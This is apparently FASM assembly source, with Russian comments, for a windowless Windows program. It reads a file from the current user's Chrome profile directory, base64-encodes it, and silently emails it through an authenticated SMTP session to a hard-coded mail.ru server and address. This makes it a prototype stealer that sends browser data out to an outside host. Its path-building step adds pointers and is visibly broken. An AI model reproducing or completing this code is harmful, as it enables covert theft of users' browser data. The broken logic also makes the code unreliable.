format PE GUI 4.0
entry start

  include 'win32a.inc'


section '.data' data readable writeable


    smtp_server  db '94.100.177.1',0                 ; IP-адрес smtp.mail.ru
  ; smtp_server  db 'smtp.mail.ru',0
  helo_0       db 'EHLO smtp.mail.ru',13,10                    ; Команда helo
  helo_0_sz    = $ - helo_0                     ;

  mail_fr      db 'MAIL FROM: test@mail.ru',13,10            ; От кого письмо
  mail_fr_sz   = $ - mail_fr                        ;

  rcpt_to      db 'RCPT TO: test@mail.ru',13,10         ; Кому отправлять
  rcpt_to_sz   = $ - rcpt_to                        ;

  data_        db 'DATA',13,10                      ; Команда data
  data_sz      = $ - data_                      ;

  auth_login_ db 'AUTH LOGIN',13,10
  auth_login_sz = $ - auth_login_

  login_  db 'LoginEncodeBase64=',13,10
  login_sz = $ - login_

  pas_ db 'passwordEncodeBase64==',13,10
  pas_sz = $ - pas_
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; Заголовок и текст письма
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  message      db 'From: Test <test@mail.ru>',13,10,\              ; От кого
          'Subject: Ver.1.0',13,10,\                   ; Тема
          'To: TEST <test@mail.ru>',13,10,\                 ; Кому
          'MIME-Version: 1.0',13,10,\                       ; Версия MIME
          'Content-Type: multipart/mixed;',13,10,\              ; Тип содержимого
          ' boundary="--ct757"',13,10,13,10,\                   ; Разделитель
          '----ct757',13,10,\
          'Content-Type: text/plain; charset=Windows-1251',13,10,\      ; Содержимое: текст,
          'Content-Transfer-Encoding: 8bit',13,10,13,10,\           ; кодировка Win-1251
          'Hello, this is the test message with attachment.',13,10,13,10,\  ; Текст письма
          '----ct757',13,10,\
          'Content-Type: application/octet-stream; name="New "',13,10,\ ; Содержимое: вложение
          'Content-Disposition: attachment; filename="Custom Dictionary.txt "',13,10,\    ; имя файла - test.rar
          'Content-Transfer-Encoding: base64',13,10,13,10           ; Поясняем, что закодировано
                                            ; с помощью base64

  message_sz   = $ - message                                ; Размер письма вместе с
                                            ; заголовком (без вложения!)


  file_name    db 'C:\Users\'; Файл, который нужно отправить

  file_name1    db '\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt',0
    uzername    dd 10 dup(?)
     sizebuf dd 15
  sock         dd 0                                 ; Дескриптор сокета
  file_h       dd 0                                 ; Дескриптор файла
  map_h        dd 0                                 ; Дескриптор мэппинга
  map_addr     dd 0                                     ; Адрес мэппинга
  al_mem       dd 0                                 ; Адрес памяти в куче

  buf_sz       = 100h                                   ; Размер буффера
  buf          rb buf_sz                                ; Буффер для recv

  WSA          WSADATA                                  ; Необходимые
  sin          sockaddr_in                              ; структуры


; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; base64 encoder without dictionary by RT Fishel
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
; ebp = length, esi -> src buffer, edi -> dst buffer
section '.code' code readable writeable executable
  b64:
    .newline:
      call     b64.store_crlf

    .encode:
      push     (76 shr 2)+1
      pop      edx

    .outer:
      dec      edx
      je       b64.newline
      lodsd
      dec      esi
      inc      ebp
      bswap    eax
      mov      ecx,4

    .inner:
      rol      eax,6
      and      al,3Fh
      cmp      al,3Eh
      jb       b64.testchar
      shl      al,2
      sub      al,((3Eh shl 2)+'A'-'+') and 0FFh

    .testchar:
      sub      al,4
      cmp      al,'0'
      jnl      b64.store
      add      al,'A'+4
      cmp      al,'Z'
      jbe      b64.store
      add      al,'a'-'Z'-1

    .store:
      stosb
      dec      ebp
      loopne   b64.inner
      jne      b64.outer
      mov      al,'='
      rep      stosb
      ret

    .store_crlf:
      mov      ax,0A0Dh
      stosw
      ret


; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; Процедура чтения в буффер из сокета
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  read_buf:
      invoke   recv,[sock],buf,buf_sz,esi
      ret


; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; Начало основной программы
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  start:
      xor      esi,esi

      invoke GetUserName,uzername,sizebuf
      mov eax,file_name
      add eax,uzername
      add eax,file_name1
      mov ebx,eax






      invoke   CreateFile,file_name,GENERIC_WRITE or GENERIC_READ,\     ; Откроем нужный
         esi,esi,OPEN_EXISTING,esi,esi                  ; нам файл
      inc      eax                              ; Выходим в
      je       exit                             ; случае ошибки
      dec      eax                              ; Если всё ок,
      mov      [file_h],eax                         ; сохраним его хэндл

      invoke   GetFileSize,eax,esi                      ; Узнаем размер файла
      mov      ebx,eax                              ; Сохраним его в ebx
      rol      eax,1                                ; Умножим размер на два
                                        ; (на всякий случай, т.к.
                                        ; размер закодированного
                                        ; в base64 файла всегда больше)
      add      eax,message_sz                           ; Прибавим к получившемуся
                                        ; результату размер уже
                                        ; имеющегося письма

      invoke   LocalAlloc,LMEM_FIXED,eax                    ; Выделим место в куче
      test     eax,eax                              ; Если ошибка -
      je       exit                             ; выходим, иначе
      mov      [al_mem],eax                         ; сохраним адрес

      mov      edi,eax                              ; Переместим в кучу
      mov      esi,message                          ; подготовленный
      mov      ecx,message_sz                           ; заголовок и текст
      rep      movsb                                ; письма

      xor      esi,esi

      invoke   CreateFileMapping,[file_h],esi,PAGE_READWRITE,esi,ebx,esi    ; Создадим file mapping
      test     eax,eax                              ; Выходим в
      je       clean_exit3                          ; случае ошибки
      mov      [map_h],eax                          ; Если всё ok, сохраним хэндл

      invoke   MapViewOfFile,eax,2,esi,esi,esi                  ; Спроецируем файл в память
      test     eax,eax                              ; Выходим в
      je       clean_exit2                          ; случае ошибки
      mov      [map_addr],eax                           ; Если всё ok,
                                        ; сохраним адрес мэппинга

      mov      esi,eax                              ; Укажем, откуда
                                        ; брать данные
      mov      ebp,ebx                              ; Укажем размер данных
      call     b64.encode                           ; Кодируем в base64

      mov      ax,0A0Dh                             ; Добавим к
      stosw                                 ; получившемуся
      mov      ax,0A0Dh                             ; письму
      stosw                                 ; CRLF
      mov      al,'.'                               ; .
      stosb                                 ; CRLF
      mov      ax,0A0Dh                             ;
      stosw                                 ;

      mov      eax,edi                              ; Вычислим размер
      sub      eax,[al_mem]                         ; получившегося письма,
      mov      ebx,eax                              ; и сохраним его в ebx

      xor      esi,esi

      invoke   WSAStartup,101h,WSA                      ; Инициализируем winsock
      test     eax,eax                              ; Выходим в
      jne      clean_exit1                          ; случае ошибки

      invoke   socket,AF_INET,SOCK_STREAM,0                 ; Создаем сокет
      inc      eax                              ; Выходим
      je       clean_exit                           ; если
      dec      eax                              ; ошибка
      mov      [sock],eax                           ; Если ok - сохраним
                                        ; его дескриптор
      ;invoke  inet_addr, smtp_server
      push     smtp_server                          ; Преобразуем адрес
      call     [inet_addr]                          ; сервера
      mov      [sin.sin_addr],eax

      mov      [sin.sin_family],AF_INET; Заполним структуру
      invoke htons,2525d
      mov      [sin.sin_port],ax                    ; sockaddr_in
                             ;

      invoke   connect,[sock],sin,10h                       ; Коннектимся к серверу
      inc      eax                              ; Если ошибка
      je       shtdown                              ; выходим

      call     read_buf                             ; Получим и
      inc      eax                              ; проверим
      je       shtdown                              ; ответ сервера
      cmp      dword [buf],'220 '                       ;
      jne      shtdown                              ;

      invoke   send,[sock],helo_0,helo_0_sz,esi                 ; Пошлем приветствие
      inc      eax                              ; Выход,
      je       shtdown                              ; если ошибка




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

      invoke   send,[sock],auth_login_, auth_login_sz,esi                 ; Пошлем приветствие
      inc      eax                              ; Выход,
      je       shtdown                              ; если ошибка

      invoke Sleep,300

      invoke   send,[sock], login_, login_sz,esi                 ; Пошлем приветствие
      inc      eax                              ; Выход,
      je       shtdown                              ; если ошибка
       invoke Sleep,300

      invoke   send,[sock], pas_, pas_sz,esi                 ; Пошлем приветствие
      inc      eax                              ; Выход,
      je       shtdown                              ; если ошибка

      invoke Sleep,300





;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
      invoke   send,[sock],mail_fr,mail_fr_sz,esi               ; MAIL FROM
      inc      eax
      je       shtdown

       invoke Sleep,300

      invoke   send,[sock],rcpt_to,rcpt_to_sz,esi               ; RCPT TO
      inc      eax
      je       shtdown
       invoke Sleep,300
      ;call     read_buf
      ;inc      eax
      ;je       shtdown
     ; cmp      dword [buf],'250 '
      ;jne      shtdown

      invoke   send,[sock],data_,data_sz,esi                    ; DATA
      inc      eax
      je       shtdown
      invoke Sleep,300
      ;call     read_buf
      ;inc      eax
      ;je       shtdown
      ;cmp      dword [buf],'354 '
      ;jne      shtdown

      invoke   send,[sock],[al_mem],ebx,esi                 ; Посылаем письмо
      inc      eax
      je       shtdown

      call     read_buf
      invoke Sleep,1000
  shtdown:
      invoke   shutdown,[sock],esi                      ; Разрываем соединение
      invoke   closesocket,[sock]                       ; и закрываем сокет

  clean_exit:
      invoke   WSACleanup

  clean_exit1:
      invoke   UnmapViewOfFile,[map_addr]                   ; Выгрузим файл из памяти

  clean_exit2:
      invoke   CloseHandle,[map_h]                      ; Закроем хэндл мэппинга

  clean_exit3:
      invoke   LocalFree,[al_mem]                       ; Освободим память в куче
      invoke   CloseHandle,[file_h]                     ; Закроем файл

  exit:
      invoke   ExitProcess,esi                          ; Выходим из программы


section '.idata' import data readable writeable                            ; Import table

  library kernel32,'KERNEL32.DLL',\
      wsock32,'WSOCK32.DLL',\
      advapi32,'ADVAPI32.DLL'

  include 'api\kernel32.inc'
  include 'api\wsock32.inc'
  include 'api\advapi32.inc'
